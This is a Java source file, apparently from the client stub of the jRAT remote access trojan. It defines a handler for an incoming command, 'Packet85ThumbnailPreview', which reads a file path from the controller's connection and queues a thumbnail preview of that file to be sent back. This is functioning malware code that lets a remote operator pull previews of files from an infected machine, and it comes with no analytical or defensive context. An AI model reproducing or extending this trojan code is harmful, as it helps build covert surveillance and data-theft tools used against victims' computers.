package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet59ThumbnailPreview;


public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.instance.readLine();

		Connection.instance.addToSendQueue(new Packet59ThumbnailPreview(file));
	}

}
